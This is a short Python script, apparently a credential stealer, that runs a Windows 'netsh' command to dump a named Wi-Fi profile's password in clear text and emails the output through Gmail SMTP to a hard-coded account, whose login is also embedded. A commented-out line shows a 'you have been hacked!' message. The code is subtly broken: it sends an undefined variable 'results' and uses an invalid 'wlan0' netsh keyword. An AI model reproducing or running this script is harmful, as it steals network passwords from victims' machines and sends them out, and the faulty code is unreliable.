import subprocess
import smtplib


def send_mail(email, password, message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


# command = 'msg * you have been hacked!'
# subprocess.Popen(command, shell=True)

command = 'netsh wlan0 show profile NETGEAR88 key=clear'
result = subprocess.check_output(command, shell=True)
send_mail('jhnwck70@gmail.com', 'abc123abc12', results)
